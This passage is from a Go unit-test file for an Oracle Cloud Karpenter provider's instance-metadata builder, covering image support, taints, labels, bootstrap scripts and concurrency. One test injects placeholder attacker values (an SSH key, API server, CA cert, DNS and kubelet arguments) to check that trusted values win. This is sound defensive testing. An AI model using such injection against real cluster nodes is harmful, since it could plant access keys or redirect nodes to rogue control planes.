			meta, err := p.BuildInstanceMetadata(context.TODO(), tc.claim, tc.class, tc.img, tc.net, false)
			require.NoError(t, err)
			tc.assertion(t, meta)
		})
	}
}

func TestProvider_IsImageSupported(t *testing.T) {
	okOke := &image.ImageResolveResult{ImageType: ociv1beta1.OKEImage}
	assert.True(t, isImageSupported(okOke))

	// CIO Hardened OL9 patterns - currently not supported by production code
	okCio := &image.ImageResolveResult{
		ImageType: ociv1beta1.Custom,
		OsVersion: lo.ToPtr(ociv1beta1.OracleLinux),
		Images:    []*ocicore.Image{{DisplayName: lo.ToPtr("EG9XA2025")}},
	}
	assert.False(t, isImageSupported(okCio))

	// Pattern "ol9_EVG" should be supported too - currently not supported
	okCio2 := &image.ImageResolveResult{
		ImageType: ociv1beta1.Custom,
		OsVersion: lo.ToPtr(ociv1beta1.OracleLinux),
		Images:    []*ocicore.Image{{DisplayName: lo.ToPtr("ol9_EVG_2025_01")}},
	}
	assert.False(t, isImageSupported(okCio2))

	// Mixed case hardened - assuming pattern is case sensitive, so this may fail
	// okCio3 := &image.ImageResolveResult{
	//     ImageType:          ociv1beta1.Custom,
	//     IsCioHardenedImage: true,
	//     OsVersion:          lo.ToPtr(ociv1beta1.OracleLinux),
	//     Images:             []*ocicore.Image{{DisplayName: lo.ToPtr("eg9xa2025")}},
	// }
	// assert.True(t, isImageSupported(okCio3))

	// OKE with hardened (still supported)
	okOkeHardened := &image.ImageResolveResult{
		ImageType: ociv1beta1.OKEImage,
	}
	assert.True(t, isImageSupported(okOkeHardened))

	// Non-matching hardened
	badCio := &image.ImageResolveResult{
		ImageType: ociv1beta1.Custom,
		OsVersion: lo.ToPtr(ociv1beta1.OracleLinux),
		Images:    []*ocicore.Image{{DisplayName: lo.ToPtr("RANDOM")}},
	}
	assert.False(t, isImageSupported(badCio))

	// Non-hardened custom
	custom := &image.ImageResolveResult{
		ImageType: ociv1beta1.Custom,
		OsVersion: lo.ToPtr(ociv1beta1.OracleLinux),
		Images:    []*ocicore.Image{{DisplayName: lo.ToPtr("EG9XA")}},
	}
	assert.False(t, isImageSupported(custom))

	// Empty images slice
	emptyImages := &image.ImageResolveResult{
		ImageType: ociv1beta1.Custom,
		Images:    []*ocicore.Image{},
	}
	assert.False(t, isImageSupported(emptyImages))
}

func TestProvider_BuildInstanceMetadata_UnsupportedOSVersion(t *testing.T) {
	p := newProvider(t)
	nc := newNodeClass()
	img := newImg(ociv1beta1.Custom, "OL8", "EG8XA2025") // OL8 hardened
	net := newNet()

	_, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, net, false)
	require.Error(t, err)
	assert.ErrorIs(t, err, InstanceMetadataError)
}

func TestProvider_BuildInstanceMetadata_HardenedImageMismatch(t *testing.T) {
	p := newProvider(t)
	nc := newNodeClass()
	img := newImg(ociv1beta1.Custom, ociv1beta1.OracleLinux, "RANDOM_NAME") // Invalid pattern
	net := newNet("subnet1")

	_, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, net, false)
	require.Error(t, err)
	assert.ErrorIs(t, err, InstanceMetadataError)
}

func TestProvider_BuildInstanceMetadata_PostBootstrapSpecialChars(t *testing.T) {
	p := newProvider(t)
	script := "echo 'hello'\necho \"world\"\n# comment"
	nc := newNodeClass()
	nc.Spec.PostBootstrapInitScript = lo.ToPtr(base64.StdEncoding.EncodeToString([]byte(script)))
	img := newImg(ociv1beta1.OKEImage, ociv1beta1.OracleLinux, "EG9XA")
	net := newNet("subnet1")

	meta, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, net, false)
	require.NoError(t, err)

	decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
	require.NoError(t, derr)
	s := string(decoded)
	assert.Contains(t, s, "\n"+script)
}

func TestProvider_BuildInstanceMetadata_NodeLabelsSpecialChars(t *testing.T) {
	p := newProvider(t)
	nc := newNodeClass()
	nc.Spec.KubeletConfig = &ociv1beta1.KubeletConfiguration{
		NodeLabels: map[string]string{"key,with,commas": "value=with=equals"},
	}
	img := newImg(ociv1beta1.OKEImage, ociv1beta1.OracleLinux, "EG9XA")
	net := newNet("subnet1")

	meta, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, net, false)
	require.NoError(t, err)

	v := meta["oke-initial-node-labels"]
	assert.Equal(t, "\"key,with,commas=value=with=equals\"", v)
}

func TestProvider_BuildInstanceMetadata_OverlappingTaints(t *testing.T) {
	p := newProvider(t)
	nc := newNodeClass()
	claim := &corev1.NodeClaim{
		Spec: corev1.NodeClaimSpec{
			Taints: []v1.Taint{
				{Key: "shared", Value: "old", Effect: v1.TaintEffectNoSchedule},
			},
			StartupTaints: []v1.Taint{
				{Key: "shared", Value: "new", Effect: v1.TaintEffectNoExecute},
				{Key: "unique", Value: "val", Effect: v1.TaintEffectNoSchedule},
			},
		},
	}
	img := newImg(ociv1beta1.OKEImage, ociv1beta1.OracleLinux, "EG9XA")
	net := newNet("subnet1")

	meta, err := p.BuildInstanceMetadata(context.TODO(), claim, nc, img, net, false)
	require.NoError(t, err)

	decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
	require.NoError(t, derr)
	s := string(decoded)
	assert.Contains(t, s, "--register-with-taints=")
	// Both should appear, startup takes precedence for overlapping key
	assert.Contains(t, s, "shared=new:NoExecute")
	assert.Contains(t, s, "unique=val:NoSchedule")
}

func TestProvider_Concurrency(t *testing.T) {
	p := newProvider(t)
	nc := newNodeClass()
	img := newImg(ociv1beta1.OKEImage, ociv1beta1.OracleLinux, "EG9XA")
	net := newNet("subnet1")

	var wg sync.WaitGroup
	results := make([]map[string]string, 20)
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			meta, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, net, false)
			require.NoError(t, err)
			results[idx] = meta
		}(i)
	}
	wg.Wait()

	// All results should be identical
	first := results[0]
	for _, res := range results[1:] {
		assert.Equal(t, first, res)
	}
}

// HELPERS
// newProvider creates a DefaultProvider with default test settings
func newProvider(t *testing.T) *DefaultProvider {
	t.Helper()
	p, err := NewProvider(context.TODO(), "10.0.0.1", []byte("CA"), ipV4SingleStack)
	if err != nil {
		t.Fatalf("NewProvider error: %v", err)
	}
	return p
}

// newImg creates an ImageResolveResult with default settings
func newImg(
	imgType ociv1beta1.ImageType, osVersion string, displayName string) *image.ImageResolveResult {
	return &image.ImageResolveResult{
		ImageType: imgType,
		OsVersion: lo.ToPtr(osVersion),
		Images:    []*ocicore.Image{{DisplayName: lo.ToPtr(displayName)}},
	}
}

// newNet creates a NetworkResolveResult with primary and optional secondary subnets
func newNet(others ...string) *network.NetworkResolveResult {
	res := &network.NetworkResolveResult{
		PrimaryVnicSubnet: &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr("subnet1")}},
	}
	if len(others) > 0 {
		res.OtherVnicSubnets = lo.Map(others, func(s string, _ int) *network.SubnetAndNsgs {
			return &network.SubnetAndNsgs{Subnet: &ocicore.Subnet{Id: lo.ToPtr(s)}}
		})
	}
	return res
}

// newNodeClass creates a minimal OCINodeClass with required fields
func newNodeClass() *ociv1beta1.OCINodeClass {
	return &ociv1beta1.OCINodeClass{
		ObjectMeta: metav1.ObjectMeta{
			Labels: map[string]string{ociv1beta1.NodeClassHash: "h123"},
		},
		Spec: ociv1beta1.OCINodeClassSpec{
			NetworkConfig: &ociv1beta1.NetworkConfig{
				PrimaryVnicConfig: &ociv1beta1.SimpleVnicConfig{
					SubnetAndNsgConfig: &ociv1beta1.SubnetAndNsgConfig{
						SubnetConfig: &ociv1beta1.SubnetConfig{SubnetId: lo.ToPtr("subnet1")},
					},
				},
			},
		},
	}
}

func TestProvider_DoesNotDuplicateDefaultTaint(t *testing.T) {
	p := newProvider(t)
	nc := newNodeClass()
	claim := &corev1.NodeClaim{
		Spec: corev1.NodeClaimSpec{
			Taints: []v1.Taint{corev1.UnregisteredNoExecuteTaint},
		},
	}
	img := newImg(ociv1beta1.OKEImage, ociv1beta1.OracleLinux, "EG9XA")
	net := newNet("subnet1")

	meta, err := p.BuildInstanceMetadata(context.TODO(), claim, nc, img, net, false)
	require.NoError(t, err)

	decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
	require.NoError(t, derr)
	s := string(decoded)
	require.Contains(t, s, "karpenter.sh/unregistered=present:NoExecute")
	require.Equal(t, 1, strings.Count(s, "karpenter.sh/unregistered=present:NoExecute"))
}

func TestProvider_PostBootstrapInitScript(t *testing.T) {
	testNodeClass := fakes.CreateBasicOciNodeClass()
	rawInputString := "touch /tmp/mytest.log && echo \"I love karpenter\" > /tmp/mytest.log"
	encodeInput := base64.StdEncoding.EncodeToString([]byte(rawInputString))
	testNodeClass.Spec.PostBootstrapInitScript = &encodeInput

	p, createErr := NewProvider(context.TODO(), "10.0.0.1", []byte("CA"), ipV4SingleStack)
	assert.NoError(t, createErr)
	result, err := p.buildUserDataForPreBakedImage(nil, &testNodeClass)
	assert.NoError(t, err)
	decodedResult, decodeErr := base64.StdEncoding.DecodeString(result)

	assert.NoError(t, decodeErr)
	assert.Contains(t, string(decodedResult[:]), rawInputString)
}

func TestProvider_BuildInstanceMetadata_CustomUserData_PassThroughAndAugment(t *testing.T) {
	p, err := NewProvider(context.TODO(), "10.8.0.1", []byte("CAXYZ"), ipV4SingleStack)
	require.NoError(t, err)

	nc := newNodeClass()
	// Provide customer user_data directly; production must not replace it with default
	nc.Spec.Metadata = map[string]string{
		"user_data":           "CUSTOM_SCRIPT",
		"custom_key":          "CUSTOM_VALUE",
		"ssh_authorized_keys": "ssh-rsa ATTACKER",
		"apiserver_host":      "ATTACKER_API_SERVER",
		"cluster_ca_cert":     "ATTACKER_CA",
		"kubedns_svc_ip":      "ATTACKER_DNS",
		"kubelet-extra-args":  "ATTACKER_KUBELET_ARGS",
	}
	nc.Spec.SshAuthorizedKeys = []string{"ssh-rsa TRUSTED"}
	// Add kubelet and labels for augmentation
	nc.Spec.KubeletConfig = &ociv1beta1.KubeletConfiguration{
		ClusterDNS: []string{"dns1", "dns2"},
		MaxPods:    lo.ToPtr(int32(16)),
		NodeLabels: map[string]string{"k": "v"},
	}
	// Enable NPN flags
	nc.Spec.NetworkConfig.SecondaryVnicConfigs = []*ociv1beta1.SecondaryVnicConfig{{}}

	claim := &corev1.NodeClaim{}
	img := newImg(ociv1beta1.OKEImage, ociv1beta1.OracleLinux, "EG9XA")
	net := newNet("subnet2") // secondary present to trigger 'other' subnets

	meta, buildErr := p.BuildInstanceMetadata(context.TODO(), claim, nc, img, net, false)
	require.NoError(t, buildErr)

	// user_data is passed through unchanged (not base64-encoded)
	assert.Equal(t, "CUSTOM_SCRIPT", meta["user_data"])
	assert.Equal(t, "CUSTOM_VALUE", meta["custom_key"])

	// Augmented keys present
	assert.Equal(t, "dns1,dns2", meta["kubedns_svc_ip"])
	kargs, ok := meta["kubelet-extra-args"]
	require.True(t, ok)
	assert.Contains(t, kargs, "--max-pods=16")

	assert.Equal(t, "10.8.0.1", meta["apiserver_host"])
	assert.Equal(t, p.caString, meta["cluster_ca_cert"])
	assert.Equal(t, "ssh-rsa TRUSTED", meta["ssh_authorized_keys"])

	// Node labels injected and quoted
	assert.Equal(t, "\"k=v\"", meta["oke-initial-node-labels"])

	// NPN flags
	assert.Equal(t, ValueTrue, meta["oke-preconfigured-vnics"])
	assert.Equal(t, ValueTrue, meta["oke-native-pod-networking"])
	assert.Equal(t, "16", meta["oke-max-pods"])
}

func TestProvider_BuildInstanceMetadata_PreBootstrapScript_Order(t *testing.T) {
	p := newProvider(t)
	nc := newNodeClass()
	pre := "echo pre"
	nc.Spec.PreBootstrapInitScript = lo.ToPtr(base64.StdEncoding.EncodeToString([]byte(pre)))

	img := newImg(ociv1beta1.OKEImage, ociv1beta1.OracleLinux, "EG9XA")
	net := newNet("subnet1")

	meta, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, net, false)
	require.NoError(t, err)

	decoded, derr := base64.StdEncoding.DecodeString(meta["user_data"])
	require.NoError(t, derr)
	s := string(decoded)

	// Pre script appears (with surrounding newlines) before the install invocation
	idxPre := strings.Index(s, "\n"+pre+"\n")
	require.NotEqual(t, -1, idxPre, "pre-bootstrap script should be present in user_data")
	idxInstall := strings.Index(s, "bash /etc/oke/oke-install.sh")
	require.NotEqual(t, -1, idxInstall, "install invocation should be present in user_data")
	assert.Less(t, idxPre, idxInstall, "pre-bootstrap script must appear before install script")
}

func TestProvider_BuildInstanceMetadata_isPreemptible(t *testing.T) {
	testCases := []bool{true, false}

	p := newProvider(t)
	nc := newNodeClass()
	img := newImg(ociv1beta1.OKEImage, ociv1beta1.OracleLinux, "EG9XA")
	net := newNet("subnet1")

	for _, tc := range testCases {
		meta, err := p.BuildInstanceMetadata(context.TODO(), &corev1.NodeClaim{}, nc, img, net, tc)
		require.NoError(t, err)
		assert.Equal(t, strconv.FormatBool(tc), meta["oke-is-preemptible"])
	}

}
